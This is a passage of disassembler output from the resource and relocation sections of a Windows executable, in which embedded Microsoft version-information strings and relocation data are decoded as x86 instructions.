  40aa74:	and    BYTE PTR [eax],ah
  40aa76:	adc    BYTE PTR [eax],al
  40aa78:	add    DWORD PTR [eax],eax
  40aa7a:	add    al,0x0
  40aa7c:	call   0x240aa83
  40aa81:	add    BYTE PTR [eax],al
  40aa83:	add    BYTE PTR [eax],al
  40aa85:	add    BYTE PTR [eax],al
  40aa87:	add    BYTE PTR [ebx+eax*1+0x34],bl
  40aa8e:	push   esi
  40aa8f:	add    BYTE PTR [ebx+0x0],dl
  40aa92:	pop    edi
  40aa93:	add    BYTE PTR [esi+0x0],dl
  40aa96:	inc    ebp
  40aa97:	add    BYTE PTR [edx+0x0],dl
  40aa9a:	push   ebx
  40aa9b:	add    BYTE PTR [ecx+0x0],cl
  40aa9e:	dec    edi
  40aa9f:	add    BYTE PTR [esi+0x0],cl
  40aaa2:	pop    edi
  40aaa3:	add    BYTE PTR [ecx+0x0],cl
  40aaa6:	dec    esi
  40aaa7:	add    BYTE PTR [esi+0x0],al
  40aaaa:	dec    edi
  40aaab:	add    BYTE PTR [eax],al
  40aaad:	add    BYTE PTR [eax],al
  40aaaf:	add    BYTE PTR [ebp+0xfeef04],bh
  40aab5:	add    BYTE PTR [ecx],al
  40aab7:	add    BYTE PTR [eax],al
  40aab9:	add    BYTE PTR [edx],cl
  40aabb:	add    BYTE PTR [eax],al
  40aabd:	inc    eax
  40aabe:	add    BYTE PTR [eax],ch
  40aac0:	add    BYTE PTR [eax],al
  40aac2:	or     al,BYTE PTR [eax]
  40aac4:	add    BYTE PTR [eax+0x0],al
  40aac7:	sub    BYTE PTR [edi],bh
  40aac9:	add    BYTE PTR [eax],al
  40aacb:	add    BYTE PTR [eax],al
  40aacd:	add    BYTE PTR [eax],al
  40aacf:	add    BYTE PTR [eax+eax*1],al
  40aad2:	add    al,0x0
  40aad4:	add    DWORD PTR [eax],eax
	...
  40aae2:	add    BYTE PTR [eax],al
  40aae4:	cli    
  40aae5:	add    al,BYTE PTR [eax]
  40aae7:	add    BYTE PTR [ecx],al
  40aae9:	add    BYTE PTR [ebx+0x0],dl
  40aaec:	je     0x40aaee
  40aaee:	jb     0x40aaf0
  40aaf0:	imul   eax,DWORD PTR [eax],0x67006e
  40aaf6:	inc    esi
  40aaf7:	add    BYTE PTR [ecx+0x0],ch
  40aafa:	ins    BYTE PTR es:[edi],dx
  40aafb:	add    BYTE PTR [ebp+0x0],ah
  40aafe:	dec    ecx
  40aaff:	add    BYTE PTR [esi+0x0],ch
  40ab02:	data16 add BYTE PTR [edi+0x0],ch
  40ab06:	add    BYTE PTR [eax],al
  40ab08:	(bad)  
  40ab09:	add    al,BYTE PTR [eax]
  40ab0b:	add    BYTE PTR [ecx],al
  40ab0d:	add    BYTE PTR [eax],dh
  40ab0f:	add    BYTE PTR [eax+eax*1],dh
  40ab12:	xor    BYTE PTR [eax],al
  40ab14:	cmp    DWORD PTR [eax],eax
  40ab16:	xor    BYTE PTR [eax],al
  40ab18:	xor    al,0x0
  40ab1a:	inc    edx
  40ab1b:	add    BYTE PTR [eax],dh
  40ab1d:	add    BYTE PTR [eax],al
  40ab1f:	add    BYTE PTR [eax+eax*1+0x16],cl
  40ab23:	add    BYTE PTR [ecx],al
  40ab25:	add    BYTE PTR [ebx+0x0],al
  40ab28:	outs   dx,DWORD PTR ds:[esi]
  40ab29:	add    BYTE PTR [ebp+0x0],ch
  40ab2c:	jo     0x40ab2e
  40ab2e:	popa   
  40ab2f:	add    BYTE PTR [esi+0x0],ch
  40ab32:	jns    0x40ab34
  40ab34:	dec    esi
  40ab35:	add    BYTE PTR [ecx+0x0],ah
  40ab38:	ins    DWORD PTR es:[edi],dx
  40ab39:	add    BYTE PTR [ebp+0x0],ah
  40ab3c:	add    BYTE PTR [eax],al
  40ab3e:	add    BYTE PTR [eax],al
  40ab40:	dec    ebp
  40ab41:	add    BYTE PTR [ecx+0x0],ch
  40ab44:	arpl   WORD PTR [eax],ax
  40ab46:	jb     0x40ab48
  40ab48:	outs   dx,DWORD PTR ds:[esi]
  40ab49:	add    BYTE PTR [ebx+0x0],dh
  40ab4c:	outs   dx,DWORD PTR ds:[esi]
  40ab4d:	add    BYTE PTR [esi+0x0],ah
  40ab50:	je     0x40ab52
  40ab52:	and    BYTE PTR [eax],al
  40ab54:	inc    ebx
  40ab55:	add    BYTE PTR [edi+0x0],ch
  40ab58:	jb     0x40ab5a
  40ab5a:	jo     0x40ab5c
  40ab5c:	outs   dx,DWORD PTR ds:[esi]
  40ab5d:	add    BYTE PTR [edx+0x0],dh
  40ab60:	popa   
  40ab61:	add    BYTE PTR [eax+eax*1+0x69],dh
  40ab65:	add    BYTE PTR [edi+0x0],ch
  40ab68:	outs   dx,BYTE PTR ds:[esi]
  40ab69:	add    BYTE PTR [eax],al
  40ab6b:	add    BYTE PTR [eax+0x0],ch
  40ab6e:	and    BYTE PTR [eax],al
  40ab70:	add    DWORD PTR [eax],eax
  40ab72:	inc    esi
  40ab73:	add    BYTE PTR [ecx+0x0],ch
  40ab76:	ins    BYTE PTR es:[edi],dx
  40ab77:	add    BYTE PTR [ebp+0x0],ah
  40ab7a:	inc    esp
  40ab7b:	add    BYTE PTR [ebp+0x0],ah
  40ab7e:	jae    0x40ab80
  40ab80:	arpl   WORD PTR [eax],ax
  40ab82:	jb     0x40ab84
  40ab84:	imul   eax,DWORD PTR [eax],0x740070
  40ab8a:	imul   eax,DWORD PTR [eax],0x6e006f
  40ab90:	add    BYTE PTR [eax],al
  40ab92:	add    BYTE PTR [eax],al
  40ab94:	push   edi
  40ab95:	add    BYTE PTR [ecx+0x0],ch
  40ab98:	outs   dx,BYTE PTR ds:[esi]
  40ab99:	add    BYTE PTR [eax+eax*1+0x6f],ah
  40ab9d:	add    BYTE PTR [edi+0x0],dh
  40aba0:	jae    0x40aba2
  40aba2:	and    BYTE PTR [eax],al
  40aba4:	push   eax
  40aba5:	add    BYTE PTR [edx+0x0],dh
  40aba8:	outs   dx,DWORD PTR ds:[esi]
  40aba9:	add    BYTE PTR [edi+0x0],ah
  40abac:	ins    DWORD PTR es:[edi],dx
  40abad:	add    BYTE PTR [ecx+0x0],ah
  40abb0:	outs   dx,BYTE PTR ds:[esi]
  40abb1:	add    BYTE PTR [eax],ah
  40abb3:	add    BYTE PTR [edi+0x0],al
  40abb6:	jb     0x40abb8
  40abb8:	outs   dx,DWORD PTR ds:[esi]
  40abb9:	add    BYTE PTR [ebp+0x0],dh
  40abbc:	jo     0x40abbe
  40abbe:	and    BYTE PTR [eax],al
  40abc0:	inc    ebx
  40abc1:	add    BYTE PTR [edi+0x0],ch
  40abc4:	outs   dx,BYTE PTR ds:[esi]
  40abc5:	add    BYTE PTR [esi+0x0],dh
  40abc8:	add    BYTE PTR gs:[edx+0x0],dh
  40abcc:	je     0x40abce
  40abce:	add    BYTE PTR gs:[edx+0x0],dh
  40abd2:	add    BYTE PTR [eax],al
  40abd4:	data16 add BYTE PTR [ebx],ah
  40abd7:	add    BYTE PTR [ecx],al
  40abd9:	add    BYTE PTR [esi+0x0],al
  40abdc:	imul   eax,DWORD PTR [eax],0x65006c
  40abe2:	push   esi
  40abe3:	add    BYTE PTR [ebp+0x0],ah
  40abe6:	jb     0x40abe8
  40abe8:	jae    0x40abea
  40abea:	imul   eax,DWORD PTR [eax],0x6e006f
  40abf0:	add    BYTE PTR [eax],al
  40abf2:	add    BYTE PTR [eax],al
  40abf4:	xor    DWORD PTR [eax],eax
  40abf6:	xor    BYTE PTR [eax],al
  40abf8:	add    BYTE PTR cs:[eax],dh
  40abfb:	add    BYTE PTR [esi],ch
  40abfd:	add    BYTE PTR [ecx],dh
  40abff:	add    BYTE PTR [eax],dh
  40ac01:	add    BYTE PTR [edx],dh
  40ac03:	add    BYTE PTR [eax+eax*1],dh
  40ac06:	xor    BYTE PTR [eax],al
  40ac08:	add    BYTE PTR cs:[ecx],dh
  40ac0b:	add    BYTE PTR [esi],dh
  40ac0d:	add    BYTE PTR [ebx],dh
  40ac0f:	add    BYTE PTR [eax],bh
  40ac11:	add    BYTE PTR [eax+eax*1],dh
  40ac14:	and    BYTE PTR [eax],al
  40ac16:	sub    BYTE PTR [eax],al
  40ac18:	je     0x40ac1a
  40ac1a:	push   0x2e003100
  40ac1f:	add    BYTE PTR [ecx],dh
  40ac21:	add    BYTE PTR ds:0x37003000,dh
  40ac27:	add    BYTE PTR [eax],dh
  40ac29:	add    BYTE PTR [ecx],bh
  40ac2b:	add    BYTE PTR ds:0x37003100,ch
  40ac31:	add    BYTE PTR [eax],dh
  40ac33:	add    BYTE PTR [eax],dh
  40ac35:	add    BYTE PTR [ecx],ch
  40ac37:	add    BYTE PTR [eax],al
  40ac39:	add    BYTE PTR [eax],al
  40ac3b:	add    BYTE PTR [eax],dh
  40ac3d:	add    BYTE PTR [eax],cl
  40ac3f:	add    BYTE PTR [ecx],al
  40ac41:	add    BYTE PTR [ecx+0x0],cl
  40ac44:	outs   dx,BYTE PTR ds:[esi]
  40ac45:	add    BYTE PTR [eax+eax*1+0x65],dh
  40ac49:	add    BYTE PTR [edx+0x0],dh
  40ac4c:	outs   dx,BYTE PTR ds:[esi]
  40ac4d:	add    BYTE PTR [ecx+0x0],ah
  40ac50:	ins    BYTE PTR es:[edi],dx
  40ac51:	add    BYTE PTR [esi+0x0],cl
  40ac54:	popa   
  40ac55:	add    BYTE PTR [ebp+0x0],ch
  40ac58:	add    BYTE PTR gs:[eax],al
  40ac5b:	add    BYTE PTR [edi+0x0],al
  40ac5e:	jb     0x40ac60
  40ac60:	jo     0x40ac62
  40ac62:	inc    ebx
  40ac63:	add    BYTE PTR [edi+0x0],ch
  40ac66:	outs   dx,BYTE PTR ds:[esi]
  40ac67:	add    BYTE PTR [esi+0x0],dh
  40ac6a:	add    BYTE PTR [eax],al
  40ac6c:	add    BYTE PTR [eax],0x2e
  40ac6f:	add    BYTE PTR [ecx],al
  40ac71:	add    BYTE PTR [eax+eax*1+0x65],cl
  40ac75:	add    BYTE PTR [edi+0x0],ah
  40ac78:	popa   
  40ac79:	add    BYTE PTR [eax+eax*1+0x43],ch
  40ac7d:	add    BYTE PTR [edi+0x0],ch
  40ac80:	jo     0x40ac82
  40ac82:	jns    0x40ac84
  40ac84:	jb     0x40ac86
  40ac86:	imul   eax,DWORD PTR [eax],0x680067
  40ac8c:	je     0x40ac8e
  40ac8e:	add    BYTE PTR [eax],al
  40ac90:	test   eax,0x4d002000
  40ac95:	add    BYTE PTR [ecx+0x0],ch
  40ac98:	arpl   WORD PTR [eax],ax
  40ac9a:	jb     0x40ac9c
  40ac9c:	outs   dx,DWORD PTR ds:[esi]
  40ac9d:	add    BYTE PTR [ebx+0x0],dh
  40aca0:	outs   dx,DWORD PTR ds:[esi]
  40aca1:	add    BYTE PTR [esi+0x0],ah
  40aca4:	je     0x40aca6
  40aca6:	and    BYTE PTR [eax],al
  40aca8:	inc    ebx
  40aca9:	add    BYTE PTR [edi+0x0],ch
  40acac:	jb     0x40acae
  40acae:	jo     0x40acb0
  40acb0:	outs   dx,DWORD PTR ds:[esi]
  40acb1:	add    BYTE PTR [edx+0x0],dh
  40acb4:	popa   
  40acb5:	add    BYTE PTR [eax+eax*1+0x69],dh
  40acb9:	add    BYTE PTR [edi+0x0],ch
  40acbc:	outs   dx,BYTE PTR ds:[esi]
  40acbd:	add    BYTE PTR [esi],ch
  40acbf:	add    BYTE PTR [eax],ah
  40acc1:	add    BYTE PTR [ecx+0x0],al
  40acc4:	ins    BYTE PTR es:[edi],dx
  40acc5:	add    BYTE PTR [eax+eax*1+0x20],ch
  40acc9:	add    BYTE PTR [edx+0x0],dh
  40accc:	imul   eax,DWORD PTR [eax],0x680067
  40acd2:	je     0x40acd4
  40acd4:	jae    0x40acd6
  40acd6:	and    BYTE PTR [eax],al
  40acd8:	jb     0x40acda
  40acda:	add    BYTE PTR gs:[ebx+0x0],dh
  40acde:	add    BYTE PTR gs:[edx+0x0],dh
  40ace2:	jbe    0x40ace4
  40ace4:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40ace9:	add    BYTE PTR [eax],al
  40aceb:	add    BYTE PTR [eax+0x0],al
  40acee:	or     al,0x0
  40acf0:	add    DWORD PTR [eax],eax
  40acf2:	dec    edi
  40acf3:	add    BYTE PTR [edx+0x0],dh
  40acf6:	imul   eax,DWORD PTR [eax],0x690067
  40acfc:	outs   dx,BYTE PTR ds:[esi]
  40acfd:	add    BYTE PTR [ecx+0x0],ah
  40ad00:	ins    BYTE PTR es:[edi],dx
  40ad01:	add    BYTE PTR [esi+0x0],al
  40ad04:	imul   eax,DWORD PTR [eax],0x65006c
  40ad0a:	outs   dx,BYTE PTR ds:[esi]
  40ad0b:	add    BYTE PTR [ecx+0x0],ah
  40ad0e:	ins    DWORD PTR es:[edi],dx
  40ad0f:	add    BYTE PTR [ebp+0x0],ah
  40ad12:	add    BYTE PTR [eax],al
  40ad14:	inc    edi
  40ad15:	add    BYTE PTR [edx+0x0],dl
  40ad18:	push   eax
  40ad19:	add    BYTE PTR [ebx+0x0],al
  40ad1c:	dec    edi
  40ad1d:	add    BYTE PTR [esi+0x0],cl
  40ad20:	push   esi
  40ad21:	add    BYTE PTR [esi],ch
  40ad23:	add    BYTE PTR [ebp+0x0],al
  40ad26:	pop    eax
  40ad27:	add    BYTE PTR [ebp+0x0],al
  40ad2a:	add    BYTE PTR [eax],al
  40ad2c:	push   0x0
  40ad2e:	and    eax,0x50000100
  40ad33:	add    BYTE PTR [edx+0x0],dh
  40ad36:	outs   dx,DWORD PTR ds:[esi]
  40ad37:	add    BYTE PTR [eax+eax*1+0x75],ah
  40ad3b:	add    BYTE PTR [ebx+0x0],ah
  40ad3e:	je     0x40ad40
  40ad40:	dec    esi
  40ad41:	add    BYTE PTR [ecx+0x0],ah
  40ad44:	ins    DWORD PTR es:[edi],dx
  40ad45:	add    BYTE PTR [ebp+0x0],ah
  40ad48:	add    BYTE PTR [eax],al
  40ad4a:	add    BYTE PTR [eax],al
  40ad4c:	dec    ebp
  40ad4d:	add    BYTE PTR [ecx+0x0],ch
  40ad50:	arpl   WORD PTR [eax],ax
  40ad52:	jb     0x40ad54
  40ad54:	outs   dx,DWORD PTR ds:[esi]
  40ad55:	add    BYTE PTR [ebx+0x0],dh
  40ad58:	outs   dx,DWORD PTR ds:[esi]
  40ad59:	add    BYTE PTR [esi+0x0],ah
  40ad5c:	je     0x40ad5e
  40ad5e:	scas   al,BYTE PTR es:[edi]
  40ad5f:	add    BYTE PTR [eax],ah
  40ad61:	add    BYTE PTR [edi+0x0],dl
  40ad64:	imul   eax,DWORD PTR [eax],0x64006e
  40ad6a:	outs   dx,DWORD PTR ds:[esi]
  40ad6b:	add    BYTE PTR [edi+0x0],dh
  40ad6e:	jae    0x40ad70
  40ad70:	scas   al,BYTE PTR es:[edi]
  40ad71:	add    BYTE PTR [eax],ah
  40ad73:	add    BYTE PTR [edi+0x0],cl
  40ad76:	jo     0x40ad78
  40ad78:	add    BYTE PTR gs:[edx+0x0],dh
  40ad7c:	popa   
  40ad7d:	add    BYTE PTR [eax+eax*1+0x69],dh
  40ad81:	add    BYTE PTR [esi+0x0],ch
  40ad84:	add    BYTE PTR [bx+si],ah
  40ad87:	add    BYTE PTR [ebx+0x0],dl
  40ad8a:	jns    0x40ad8c
  40ad8c:	jae    0x40ad8e
  40ad8e:	je     0x40ad90
  40ad90:	add    BYTE PTR gs:[ebp+0x0],ch
  40ad94:	add    BYTE PTR [eax],al
  40ad96:	add    BYTE PTR [eax],al
  40ad98:	inc    esi
  40ad99:	add    BYTE PTR [ecx],dl
  40ad9b:	add    BYTE PTR [ecx],al
  40ad9d:	add    BYTE PTR [eax+0x0],dl
  40ada0:	jb     0x40ada2
  40ada2:	outs   dx,DWORD PTR ds:[esi]
  40ada3:	add    BYTE PTR [eax+eax*1+0x75],ah
  40ada7:	add    BYTE PTR [ebx+0x0],ah
  40adaa:	je     0x40adac
  40adac:	push   esi
  40adad:	add    BYTE PTR [ebp+0x0],ah
  40adb0:	jb     0x40adb2
  40adb2:	jae    0x40adb4
  40adb4:	imul   eax,DWORD PTR [eax],0x6e006f
  40adba:	add    BYTE PTR [eax],al
  40adbc:	xor    DWORD PTR [eax],eax
  40adbe:	xor    BYTE PTR [eax],al
  40adc0:	add    BYTE PTR cs:[eax],dh
  40adc3:	add    BYTE PTR [esi],ch
  40adc5:	add    BYTE PTR [ecx],dh
  40adc7:	add    BYTE PTR [eax],dh
  40adc9:	add    BYTE PTR [edx],dh
  40adcb:	add    BYTE PTR [eax+eax*1],dh
  40adce:	xor    BYTE PTR [eax],al
  40add0:	add    BYTE PTR cs:[ecx],dh
  40add3:	add    BYTE PTR [esi],dh
  40add5:	add    BYTE PTR [ebx],dh
  40add7:	add    BYTE PTR [eax],bh
  40add9:	add    BYTE PTR [eax+eax*1],dh
  40addc:	add    BYTE PTR [eax],al
  40adde:	add    BYTE PTR [eax],al
  40ade0:	inc    esp
  40ade1:	add    BYTE PTR [eax],al
  40ade3:	add    BYTE PTR [ecx],al
  40ade5:	add    BYTE PTR [esi+0x0],dl
  40ade8:	popa   
  40ade9:	add    BYTE PTR [edx+0x0],dh
  40adec:	inc    esi
  40aded:	add    BYTE PTR [ecx+0x0],ch
  40adf0:	ins    BYTE PTR es:[edi],dx
  40adf1:	add    BYTE PTR [ebp+0x0],ah
  40adf4:	dec    ecx
  40adf5:	add    BYTE PTR [esi+0x0],ch
  40adf8:	data16 add BYTE PTR [edi+0x0],ch
  40adfc:	add    BYTE PTR [eax],al
  40adfe:	add    BYTE PTR [eax],al
  40ae00:	and    al,0x0
  40ae02:	add    al,0x0
  40ae04:	add    BYTE PTR [eax],al
  40ae06:	push   esp
  40ae07:	add    BYTE PTR [edx+0x0],dh
  40ae0a:	popa   
  40ae0b:	add    BYTE PTR [esi+0x0],ch
  40ae0e:	jae    0x40ae10
  40ae10:	ins    BYTE PTR es:[edi],dx
  40ae11:	add    BYTE PTR [ecx+0x0],ah
  40ae14:	je     0x40ae16
  40ae16:	imul   eax,DWORD PTR [eax],0x6e006f
  40ae1c:	add    BYTE PTR [eax],al
  40ae1e:	add    BYTE PTR [eax],al
  40ae20:	or     DWORD PTR [eax+esi*4],eax
  40ae23:	add    al,0x0
  40ae25:	add    BYTE PTR [eax],al
  40ae27:	add    ch,cl
  40ae29:	dec    ch
  40ae2b:	(bad)  
  40ae2c:	fadd   DWORD PTR [eax]
  40ae2e:	add    BYTE PTR [eax],al
  40ae30:	add    BYTE PTR [eax],al
  40ae32:	add    DWORD PTR [eax],eax
  40ae34:	add    BYTE PTR [eax],al
  40ae36:	add    BYTE PTR [eax],al
  40ae38:	adc    DWORD PTR [eax],eax
  40ae3a:	add    BYTE PTR [eax],al
  40ae3c:	add    BYTE PTR [eax],al
  40ae3e:	add    BYTE PTR [eax],al
  40ae40:	add    al,BYTE PTR [eax]
  40ae42:	add    BYTE PTR [eax],al
  40ae44:	adc    bh,BYTE PTR [ebx-0x52]
  40ae47:	lods   al,BYTE PTR ds:[esi]
  40ae48:	jo     0x40adf2
  40ae4a:	pusha  
  40ae4b:	stc    
  40ae4c:	cld    
  40ae4d:	xor    al,0xfc
  40ae4f:	lods   al,BYTE PTR ds:[esi]
  40ae50:	fiadd  WORD PTR [eax+0x3552ed42]
  40ae56:	hlt    
  40ae57:	push   0xa95278b2
  40ae5c:	arpl   WORD PTR [edi-0x1eb16659],si
  40ae62:	inc    eax
  40ae63:	sbb    eax,0x0
	...
  40ae7c:	mov    BYTE PTR [eax],al
  40ae7e:	add    BYTE PTR [eax],al
  40ae80:	push   cs
  40ae81:	add    BYTE PTR [eax],al
  40ae83:	add    BYTE PTR [eax+0x10000000],bl
  40ae89:	add    BYTE PTR [eax],al
  40ae8b:	add    BYTE PTR [eax+0xe000000],ch
  40ae91:	add    BYTE PTR [eax],al
  40ae93:	add    BYTE PTR [eax+0x10000000],bh
	...
  40aea1:	add    BYTE PTR [eax],al
  40aea3:	add    al,cl
  40aea5:	add    BYTE PTR [eax],al
  40aea7:	add    BYTE PTR [eax+eax*1],cl
  40aeaa:	add    BYTE PTR [eax],al
  40aeac:	add    BYTE PTR [eax],al
  40aeae:	add    BYTE PTR [eax],al
  40aeb0:	dec    ebp
  40aeb1:	add    BYTE PTR [ebp+0x0],dl
  40aeb4:	dec    ecx
	...
  40aebd:	add    BYTE PTR [eax],al
  40aebf:	add    BYTE PTR [ebx],al
  40aec1:	add    BYTE PTR [eax],al
  40aec3:	add    BYTE PTR [esi],cl
  40aec5:	add    BYTE PTR [eax],al
  40aec7:	add    BYTE PTR [eax],dl
  40aec9:	add    BYTE PTR [eax],al
  40aecb:	add    BYTE PTR [eax],bl
  40aecd:	add    BYTE PTR [eax],al
  40aecf:	add    BYTE PTR [ebp+0x0],cl
  40aed2:	push   ebp
  40aed3:	add    BYTE PTR [ecx+0x0],cl
	...
  40aede:	add    BYTE PTR [eax],al
  40aee0:	add    eax,DWORD PTR [eax]
  40aee2:	add    BYTE PTR [eax],al
  40aee4:	push   es
  40aee5:	add    BYTE PTR [eax],al
  40aee7:	add    BYTE PTR [esi],cl
  40aee9:	add    BYTE PTR [eax],al
  40aeeb:	add    BYTE PTR [eax],dl
  40aeed:	add    BYTE PTR [eax],al
  40aeef:	add    BYTE PTR [ebp+0x0],ah
  40aef2:	outs   dx,BYTE PTR ds:[esi]
  40aef3:	add    BYTE PTR ds:0x53005500,ch
  40aef9:	add    BYTE PTR [eax],al
  40aefb:	add    BYTE PTR [eax],al
  40aefd:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

0040b000 <.reloc>:
  40b000:	add    BYTE PTR [eax],dl
  40b002:	add    BYTE PTR [eax],al
  40b004:	dec    eax
  40b005:	add    BYTE PTR [eax],al
  40b007:	add    BYTE PTR [eax+esi*1],al
  40b00a:	or     BYTE PTR [eax],dh
  40b00c:	or     al,0x30
  40b00e:	sbb    BYTE PTR [eax],dh
  40b010:	sbb    al,0x30
  40b012:	mov    al,0x30
  40b014:	mov    ah,0x30
  40b016:	mov    eax,0xc030bc30
  40b01b:	xor    ah,al
  40b01d:	xor    al,cl
  40b01f:	xor    ah,cl
  40b021:	xor    al,dl
  40b023:	xor    ah,dl
  40b025:	xor    al,bl
  40b027:	xor    ah,bl
  40b029:	xor    al,ah
  40b02b:	xor    ah,ah
  40b02d:	xor    al,ch
  40b02f:	xor    ah,ch
  40b031:	xor    al,dh
  40b033:	xor    ah,dh
  40b035:	xor    al,bh
  40b037:	xor    ah,bh
  40b039:	xor    BYTE PTR [eax],al
  40b03b:	xor    DWORD PTR [ecx+esi*1],eax
  40b03e:	aam    0x36
  40b040:	fdiv   DWORD PTR [esi]
  40b042:	loopne 0x40b07a
  40b044:	call   0x40b07f
  40b049:	and    BYTE PTR [eax],al
  40b04b:	add    BYTE PTR [eax+eax*1+0x35f70000],dh
  40b052:	imul   esi,DWORD PTR [esi],0x36a03690
  40b058:	pop    es
  40b059:	aaa    
  40b05a:	pop    ecx
  40b05b:	aaa    
  40b05c:	xchg   ebx,eax
  40b05d:	aaa    
  40b05e:	shl    BYTE PTR [edi],cl
  40b060:	(bad)  
  40b061:	aaa    
  40b062:	fdiv   QWORD PTR [edi]
  40b064:	loopne 0x40b09d
  40b066:	out    0x37,al
  40b068:	jmp    0x2238:0x1137f137
  40b06f:	cmp    BYTE PTR [edi],dh
  40b071:	cmp    BYTE PTR [edx+0x38],al
  40b074:	push   edx
  40b075:	cmp    BYTE PTR [edi+0x38],dl
  40b078:	xchg   ebx,eax
  40b079:	cmp    BYTE PTR [ebx-0x1fc72fc8],ch
  40b07f:	cmp    dh,ah
  40b081:	cmp    BYTE PTR [esi],al
  40b083:	cmp    DWORD PTR ds:0x48393139,edx
  40b089:	cmp    DWORD PTR [edx+0x39],ebx
  40b08c:	cmp    WORD PTR [ecx+edi*1-0x7f],si
  40b091:	cmp    DWORD PTR [ecx+edi*1+0x3a1239e6],esi
  40b098:	and    al,0x3a
  40b09a:	inc    ebx
  40b09b:	cmp    ah,BYTE PTR [eax+0x3a]
  40b09e:	jne    0x40b0da
  40b0a0:	popf   
  40b0a1:	cmp    ah,BYTE PTR [ebx-0x23c545c6]
  40b0a7:	cmp    ah,dl
  40b0a9:	cmp    bh,dl
  40b0ab:	cmp    al,BYTE PTR [eax]
  40b0ad:	cmp    edx,DWORD PTR [ebx]
  40b0af:	cmp    ebx,DWORD PTR [esi]
  40b0b1:	cmp    edi,DWORD PTR [edi]
  40b0b3:	cmp    eax,DWORD PTR [ebp+0x3b]
  40b0b6:	push   esp
  40b0b7:	cmp    esi,DWORD PTR [ebp+0x3b]
  40b0ba:	jge    0x40b0f7
  40b0bc:	cmp    DWORD PTR [ebx],0xffffff9d
  40b0bf:	cmp    ebp,DWORD PTR [edx-0x1c42dc5]
  40b0c5:	cmp    ecx,DWORD PTR [edx]
  40b0c7:	cmp    al,0x23
  40b0c9:	cmp    al,0x29
  40b0cb:	cmp    al,0x36
  40b0cd:	cmp    al,0x51
  40b0cf:	cmp    al,0x9a
  40b0d1:	cmp    al,0xa0
  40b0d3:	cmp    al,0xbb
  40b0d5:	cmp    al,0xc7
  40b0d7:	cmp    al,0xe2
  40b0d9:	cmp    al,0x6
  40b0db:	cmp    eax,0x3d2b3d1a
  40b0e0:	push   0x3d
  40b0e2:	(bad)  
  40b0e3:	cmp    eax,0x3db93d9c
  40b0e8:	sar    DWORD PTR ds:0x3e643dee,cl
  40b0ee:	jl     0x40b12e
  40b0f0:	cwde   
  40b0f1:	xor    DWORD PTR ds:[edi],edi
  40b0f4:	push   0x883f773f
  40b0f9:	aas    
  40b0fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0fb:	aas    
  40b0fc:	add    BYTE PTR [eax],dh
  40b0fe:	add    BYTE PTR [eax],al
  40b100:	pop    eax
  40b101:	add    DWORD PTR [eax],eax
  40b103:	add    BYTE PTR [ecx],al
  40b105:	xor    BYTE PTR [eax],dl
  40b107:	xor    BYTE PTR [ebx+0x30],al
  40b10a:	push   edx
  40b10b:	xor    BYTE PTR [eax+esi*1+0x78],bl
  40b10f:	xor    BYTE PTR [edi+0x30],bh
  40b112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b113:	xor    ah,al
  40b115:	xor    bh,bl
  40b117:	xor    bl,bh
  40b119:	xor    BYTE PTR [esi],dl
  40b11b:	xor    DWORD PTR [esi+0x31],edx
  40b11e:	push   0x92318031
  40b123:	xor    DWORD PTR [ebx-0x29ce3fcf],esi
  40b129:	xor    ebx,esp
  40b12b:	xor    edx,edi
  40b12d:	xor    DWORD PTR [ebx],ebp
  40b12f:	xor    bh,BYTE PTR [esi]
  40b131:	xor    ch,BYTE PTR [edi+0x32]
  40b134:	xchg   DWORD PTR [edx],esi
  40b136:	popf   
  40b137:	xor    ch,BYTE PTR [ebx-0x20cd48ce]
  40b13d:	xor    bh,ch
  40b13f:	xor    dl,BYTE PTR [ebx]
  40b141:	xor    esi,DWORD PTR [ecx]
  40b143:	xor    eax,DWORD PTR [ebx+esi*1+0x4b]
  40b147:	xor    esp,DWORD PTR [ebx+esi*1+0x76]
  40b14b:	xor    edx,DWORD PTR [ecx-0x27cc40cd]
  40b151:	xor    edi,edx
  40b153:	xor    esp,DWORD PTR [edi]
  40b155:	xor    al,0x3a
  40b157:	xor    al,0x43
  40b159:	xor    al,0x51
  40b15b:	xor    al,0x79
  40b15d:	xor    al,0x93
  40b15f:	xor    al,0x9b
  40b161:	xor    al,0xa0
  40b163:	xor    al,0xb2
  40b165:	xor    al,0xc3
  40b167:	xor    al,0xed
  40b169:	xor    al,0xff
  40b16b:	xor    al,0x10
  40b16d:	xor    eax,0x35483536
  40b172:	pop    ecx
  40b173:	xor    eax,0x35bf35ac
  40b178:	fdiv   QWORD PTR ds:0x35f935ee
  40b17e:	add    al,0x36
  40b180:	sbb    al,0x36
  40b182:	and    dh,BYTE PTR [esi]
  40b184:	cs ss dec ecx
  40b187:	ss pop edx
  40b189:	imul   esi,DWORD PTR ss:[esi],0x3692367c
  40b190:	test   al,0x36
  40b192:	mov    esi,0xec36d436
  40b197:	div    BYTE PTR ss:[esi]
  40b19a:	and    BYTE PTR [edi],dh
  40b19c:	sub    esi,DWORD PTR [edi]
  40b19e:	inc    ebp
  40b19f:	aaa    
  40b1a0:	push   ecx
  40b1a1:	aaa    
  40b1a2:	test   DWORD PTR [edi],esi
  40b1a4:	xchg   ecx,eax
  40b1a5:	aaa    
  40b1a6:	lds    esi,FWORD PTR [edi]
  40b1a8:	shl    DWORD PTR [edi],1
  40b1aa:	std    
  40b1ab:	aaa    
  40b1ac:	adc    DWORD PTR [eax],edi
  40b1ae:	and    al,0x38
  40b1b0:	push   edx
  40b1b1:	cmp    DWORD PTR [esi+0x39],ebx
  40b1b4:	arpl   WORD PTR [ecx],di
  40b1b6:	push   0x39
  40b1b8:	jae    0x40b1f3
  40b1ba:	jp     0x40b1f5
  40b1bc:	test   al,0x39
  40b1be:	scas   eax,DWORD PTR es:[edi]
  40b1bf:	cmp    DWORD PTR [esi-0x1ec635c7],esi
  40b1c5:	cmp    eax,ebp
  40b1c7:	cmp    esi,esi
  40b1c9:	cmp    DWORD PTR ds:0x3b3a1b3a,edx
  40b1cf:	cmp    al,BYTE PTR [ebp+0x3a]
  40b1d2:	pop    esp
  40b1d3:	cmp    bh,BYTE PTR [eax+0x3a]
  40b1d6:	cmp    DWORD PTR [edx],0x3a973a8c
  40b1dc:	mov    eax,ds:0xb43aa83a
  40b1e1:	cmp    al,al
  40b1e3:	cmp    cl,bl
  40b1e5:	cmp    dl,dh
  40b1e7:	cmp    bh,bh
